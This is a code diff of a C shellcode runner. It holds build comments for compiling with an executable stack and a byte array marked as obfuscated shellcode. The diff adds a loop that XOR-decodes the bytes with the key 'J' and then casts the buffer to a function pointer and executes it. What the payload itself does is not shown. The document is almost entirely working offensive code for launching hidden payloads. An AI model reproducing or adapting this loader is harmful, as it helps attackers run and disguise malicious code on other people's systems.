@@ -5,6 +5,7 @@
 ////make sure to use the -z execstack options when trying to run shellcode, since by default the stack where you save your shellcode is not executable
 //gcc -o hack.out hack.c -z execstack  / gcc -o hack.out hack.c -z execstack -static  / docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o newelf.elf newelf.c
 
+//Obfuscated shellcode here
 unsigned char buf[] = 
 "\xeb\x27\x5b\x53\x5f\xb0\x01\xfc\xae\x75\xfd\x57\x59\x53\x5e"
 "\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xb2\x1d"
@@ -24,6 +25,15 @@ unsigned char buf[] =
 
 int main (int argc, char **argv)
 {
-  int (*ret)() = (int(*)())buf;
-  ret();
+   //decrypt the shellcode
+   char xor_key = 'J';
+   int arraysize = (int) sizeof(buf);
+   for (int i=0; i<arraysize-1; i++)
+   {
+     buf[i] = buf[i]^xor_key;
+   }
+  
+  //executing the shellcode
+   int (*ret)() = (int(*)())buf;
+   ret();
 }
